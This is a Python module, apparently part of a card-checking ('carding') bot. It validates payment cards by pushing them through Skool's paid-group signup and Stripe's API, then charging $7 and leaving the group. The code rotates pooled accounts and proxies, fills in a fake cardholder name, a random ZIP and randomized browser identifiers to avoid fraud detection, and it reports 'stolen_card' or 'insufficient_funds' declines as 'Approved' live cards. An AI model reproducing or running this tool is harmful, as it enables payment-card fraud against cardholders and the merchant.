import asyncio
import time
import random
import string
import os
import logging
from gates.skool_accounts import (
    get_next_account, get_authed_client, invalidate_session,
    get_account_lock, close_client, get_fallback_account,
    get_next_account_for_user, get_fallback_account_for_user,
)

logger = logging.getLogger("skool_charge")

SKOOL_API = "https://api2.skool.com"
STRIPE_API = "https://api.stripe.com/v1"

BILLING_PK = "pk_live_51Msq2SK2xk1aF7GmLfdnbGQwTp0k2kt23vSuMyDBouKfriqp9W52yocwbPK72oXs5LtVsFYqiJ0oMfXouhXZMFSu00T7SlnP47"

GROUP_NAME = "loudbudgets"
GROUP_ID = "99a1e27651dc4008abcefd5cea0a10a1"

MAX_RETRIES = 3
RETRY_DELAY_MIN = 0.5
RETRY_DELAY_MAX = 1.5
REQUEST_TIMEOUT = 15


def _random_guid():
    return "".join(random.choices(string.hexdigits.lower(), k=32))


async def _leave_group(client):
    for endpoint in [
        f"{SKOOL_API}/groups/{GROUP_ID}/cancel-join-group-paid",
        f"{SKOOL_API}/groups/{GROUP_NAME}/cancel-join",
        f"{SKOOL_API}/groups/{GROUP_NAME}/leave",
    ]:
        try:
            await client.post(endpoint, timeout=15)
        except Exception:
            pass
    logger.debug(f"Auto-leave done for {GROUP_NAME}")


async def skool_charge_check(cc, mm, yy, cvv, proxy=None, user_id=None, is_admin=False):
    tried_emails = set()
    last_result = None

    for _ in range(3):
        if user_id:
            account, source = await get_next_account_for_user(user_id, is_admin=is_admin)
        else:
            account = await get_next_account()

        if not account:
            return last_result or "NO_SKOOL_ACCOUNT"

        if account["email"] in tried_emails:
            if user_id:
                fallback = await get_fallback_account_for_user(user_id, account["email"], is_admin=is_admin)
            else:
                fallback = await get_fallback_account(account["email"])
            if not fallback or fallback["email"] in tried_emails:
                return last_result or "Error - All accounts already member"
            account = fallback

        tried_emails.add(account["email"])

        lock = get_account_lock(account)
        async with lock:
            result = await _check_with_account(cc, mm, yy, cvv, account, user_proxy=proxy)

        if "Skool Account Login Error" in result:
            if user_id:
                fallback = await get_fallback_account_for_user(user_id, account["email"], is_admin=is_admin)
            else:
                fallback = await get_fallback_account(account["email"])
            if fallback and fallback["email"] not in tried_emails:
                tried_emails.add(fallback["email"])
                lock2 = get_account_lock(fallback)
                async with lock2:
                    result = await _check_with_account(cc, mm, yy, cvv, fallback, user_proxy=proxy)

        if "already member" not in result.lower():
            return result

        last_result = result

    return last_result or "Error - All accounts already member"


async def _check_with_account(cc, mm, yy, cvv, account, user_proxy=None):
    start = time.time()

    if len(yy) == 2:
        exp_year = f"20{yy}"
    else:
        exp_year = yy
    mm = mm.zfill(2)

    stripe_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json",
    }

    for attempt in range(MAX_RETRIES):
        client = None
        joined_group = False
        try:
            force_refresh = attempt > 0
            client = await get_authed_client(account, force_refresh=force_refresh, user_proxy=user_proxy)
            if not client:
                if attempt < MAX_RETRIES - 1:
                    invalidate_session(account)
                    await asyncio.sleep(random.uniform(RETRY_DELAY_MIN, RETRY_DELAY_MAX))
                    continue
                elapsed = round(time.time() - start, 2)
                return f"Error - Skool Account Login Error [{elapsed}s]"

            await _leave_group(client)

            r_si = await client.post(
                f"{SKOOL_API}/self/setup-payment-method", json={}, timeout=REQUEST_TIMEOUT
            )
            if r_si.status_code != 200:
                if r_si.status_code in (401, 403) and attempt < MAX_RETRIES - 1:
                    invalidate_session(account)
                    await asyncio.sleep(random.uniform(RETRY_DELAY_MIN, RETRY_DELAY_MAX))
                    continue
                elapsed = round(time.time() - start, 2)
                return f"Error - SetupIntent failed ({r_si.status_code}) [{elapsed}s]"

            si_data = r_si.json()
            client_secret = si_data.get("client_secret")
            setup_intent_id = si_data.get("setup_intent_id")

            if not client_secret or not setup_intent_id:
                if attempt < MAX_RETRIES - 1:
                    invalidate_session(account)
                    await asyncio.sleep(random.uniform(RETRY_DELAY_MIN, RETRY_DELAY_MAX))
                    continue
                elapsed = round(time.time() - start, 2)
                return f"Error - Invalid SetupIntent [{elapsed}s]"

            pm_data = {
                "type": "card",
                "card[number]": cc,
                "card[exp_month]": mm,
                "card[exp_year]": exp_year,
                "card[cvc]": cvv,
                "billing_details[name]": "John Smith",
                "billing_details[address][country]": "US",
                "billing_details[address][postal_code]": str(random.randint(10001, 99999)),
                "guid": _random_guid(),
                "muid": _random_guid(),
                "sid": _random_guid(),
                "payment_user_agent": "stripe.js/a24a2bc0a2; stripe-js-v3/a24a2bc0a2",
                "referrer": "https://www.skool.com",
                "time_on_page": str(random.randint(30000, 120000)),
                "key": BILLING_PK,
            }

            r_pm = await client.post(
                f"{STRIPE_API}/payment_methods", data=pm_data, headers=stripe_headers, timeout=REQUEST_TIMEOUT
            )
            pm_resp = r_pm.json()

            if "error" in pm_resp:
                elapsed = round(time.time() - start, 2)
                err = pm_resp["error"]
                code = err.get("code", "unknown")
                msg = err.get("message", "Unknown error")
                if code == "incorrect_number":
                    return f"Declined - Invalid Card Number [{elapsed}s]"
                if "expiry" in msg.lower():
                    return f"Declined - Invalid Expiry [{elapsed}s]"
                if code == "expired_card":
                    return f"Declined - Expired Card [{elapsed}s]"
                return f"Declined - {code}: {msg[:80]} [{elapsed}s]"

            pm_id = pm_resp.get("id")
            if not pm_id:
                elapsed = round(time.time() - start, 2)
                return f"Declined - PM creation failed [{elapsed}s]"

            card = pm_resp.get("card", {})
            brand = card.get("brand", "unknown").upper()
            last4 = card.get("last4", "????")
            funding = card.get("funding", "unknown").upper()
            country = card.get("country", "??")
            info = f"{brand} {funding} | {country} | {last4}"

            r_confirm = await client.post(
                f"{STRIPE_API}/setup_intents/{setup_intent_id}/confirm",
                data={"payment_method": pm_id, "client_secret": client_secret, "key": BILLING_PK},
                headers=stripe_headers,
                timeout=REQUEST_TIMEOUT,
            )
            confirm_resp = r_confirm.json()
            setup_status = confirm_resp.get("status", "")

            if setup_status == "requires_payment_method":
                elapsed = round(time.time() - start, 2)
                last_error = confirm_resp.get("last_setup_error", {})
                if last_error:
                    code = last_error.get("code", "")
                    decline = last_error.get("decline_code", "")
                    msg = last_error.get("message", "")
                    live_declines = [
                        "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
                        "pickup_card", "restricted_card", "security_violation",
                        "incorrect_cvc", "invalid_cvc", "incorrect_zip",
                        "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
                    ]
                    if decline in live_declines or code in live_declines:
                        return f"Approved - {decline or code} | {info} [{elapsed}s]"
                    if code == "card_declined":
                        return f"Declined - {decline or 'Card Declined'} | {info} [{elapsed}s]"
                    if code == "expired_card":
                        return f"Declined - Expired Card | {info} [{elapsed}s]"
                    return f"Declined - {code}: {msg[:60]} | {info} [{elapsed}s]"
                return f"Declined - Setup Failed | {info} [{elapsed}s]"

            try:
                await client.post(
                    f"{SKOOL_API}/self/add-payment-method",
                    json={"pt": pm_id, "sid": setup_intent_id},
                    timeout=REQUEST_TIMEOUT,
                )
            except Exception:
                pass

            await client.post(
                f"{SKOOL_API}/groups/{GROUP_ID}/init-join-group-paid", json={}, timeout=REQUEST_TIMEOUT
            )

            r_join = await client.post(
                f"{SKOOL_API}/groups/{GROUP_NAME}/join-group-paid",
                params={"pm": pm_id, "recurring_interval": "month", "tier": "standard"},
                timeout=REQUEST_TIMEOUT,
            )
            joined_group = True
            elapsed = round(time.time() - start, 2)

            if r_join.status_code == 200:
                join_data = r_join.json()
                cs = join_data.get("clientSecret") or join_data.get("client_secret")
                if cs:
                    pi_id = cs.split("_secret_")[0]
                    r_pi = await client.post(
                        f"{STRIPE_API}/payment_intents/{pi_id}/confirm",
                        data={"payment_method": pm_id, "client_secret": cs, "key": BILLING_PK},
                        headers=stripe_headers,
                        timeout=REQUEST_TIMEOUT,
                    )
                    pi_resp = r_pi.json()
                    pi_status = pi_resp.get("status", "")
                    await _leave_group(client)
                    if pi_status == "succeeded":
                        return f"Approved - Charged $7 | {info} [{elapsed}s]"
                    elif pi_status == "requires_action":
                        return f"Approved - 3DS Required | {info} [{elapsed}s]"
                    elif pi_status == "requires_payment_method":
                        pi_err = pi_resp.get("last_payment_error", {})
                        decline = pi_err.get("decline_code", "")
                        code = pi_err.get("code", "")
                        live_declines = ["insufficient_funds", "do_not_honor", "lost_card", "stolen_card", "pickup_card", "restricted_card", "incorrect_cvc", "card_velocity_exceeded"]
                        if decline in live_declines or code in live_declines:
                            return f"Approved - {decline or code} | {info} [{elapsed}s]"
                        return f"Declined - {decline or code or 'charge_failed'} | {info} [{elapsed}s]"
                    else:
                        return f"Declined - PI Status: {pi_status} | {info} [{elapsed}s]"
                await _leave_group(client)
                return f"Approved - Charged $7 | {info} [{elapsed}s]"

            elif r_join.status_code == 422:
                await _leave_group(client)
                join_data = r_join.json()
                fields = join_data.get("fields", [])
                if fields:
                    err_name = fields[0].get("name", "")
                    err_msg = fields[0].get("error", "")
                    live_declines = ["insufficient_funds", "do_not_honor", "lost_card", "stolen_card", "pickup_card", "restricted_card", "incorrect_cvc", "invalid_cvc", "incorrect_zip", "card_velocity_exceeded", "withdrawal_count_limit_exceeded"]
                    if err_msg in live_declines:
                        return f"Approved - {err_msg} | {info} [{elapsed}s]"
                    if "declined" in err_name.lower():
                        return f"Declined - {err_msg or 'Card Declined'} | {info} [{elapsed}s]"
                    if err_msg == "expired_card":
                        return f"Declined - Expired Card | {info} [{elapsed}s]"
                    return f"Declined - {err_msg or err_name} | {info} [{elapsed}s]"
                return f"Declined - Charge Failed (422) | {info} [{elapsed}s]"

            elif r_join.status_code == 400:
                body = r_join.text
                if "already" in body.lower() or "member" in body.lower():
                    await _leave_group(client)
                    if attempt < MAX_RETRIES - 1:
                        invalidate_session(account)
                        await asyncio.sleep(random.uniform(RETRY_DELAY_MIN, RETRY_DELAY_MAX))
                        continue
                    return f"Error - Account already member [{elapsed}s]"
                await _leave_group(client)
                return f"Declined - {body[:80]} | {info} [{elapsed}s]"

            elif r_join.status_code in (401, 403):
                await _leave_group(client)
                if attempt < MAX_RETRIES - 1:
                    invalidate_session(account)
                    await asyncio.sleep(random.uniform(RETRY_DELAY_MIN, RETRY_DELAY_MAX))
                    continue
                return f"Error - Join failed ({r_join.status_code}) | {info} [{elapsed}s]"

            else:
                await _leave_group(client)
                return f"Error - Join failed ({r_join.status_code}) | {info} [{elapsed}s]"

        except (TimeoutError, ConnectionError, OSError) as e:
            if client and joined_group:
                await _leave_group(client)
            err_str = str(e)
            is_proxy_err = any(s in err_str for s in ["407", "CONNECT tunnel", "proxy", "Proxy"])
            if is_proxy_err:
                logger.warning(f"Proxy error on attempt {attempt+1}: {err_str[:100]}")
                from gates.skool_accounts import _mark_proxies_dead
                _mark_proxies_dead()
                invalidate_session(account)
                if attempt < MAX_RETRIES - 1:
                    await asyncio.sleep(0.5)
                    continue
            else:
                logger.warning(f"Timeout/connection error on attempt {attempt+1}: {e}")
                if attempt < MAX_RETRIES - 1:
                    await asyncio.sleep(random.uniform(RETRY_DELAY_MIN, RETRY_DELAY_MAX))
                    continue
            elapsed = round(time.time() - start, 2)
            return f"Error - Gateway Timeout [{elapsed}s]"
        except Exception as e:
            if client and joined_group:
                await _leave_group(client)
            err_str = str(e)
            is_proxy_err = any(s in err_str for s in ["407", "CONNECT tunnel", "proxy", "Proxy"])
            if is_proxy_err:
                logger.warning(f"Proxy error on attempt {attempt+1}: {err_str[:100]}")
                from gates.skool_accounts import _mark_proxies_dead
                _mark_proxies_dead()
                invalidate_session(account)
                if attempt < MAX_RETRIES - 1:
                    await asyncio.sleep(0.5)
                    continue
            else:
                logger.warning(f"Unexpected error on attempt {attempt+1}: {e}")
                if attempt < MAX_RETRIES - 1:
                    invalidate_session(account)
                    await asyncio.sleep(random.uniform(RETRY_DELAY_MIN, RETRY_DELAY_MAX))
                    continue
            elapsed = round(time.time() - start, 2)
            return f"Error - {str(e)[:80]} [{elapsed}s]"

    elapsed = round(time.time() - start, 2)
    return f"Error - Max retries exceeded [{elapsed}s]"
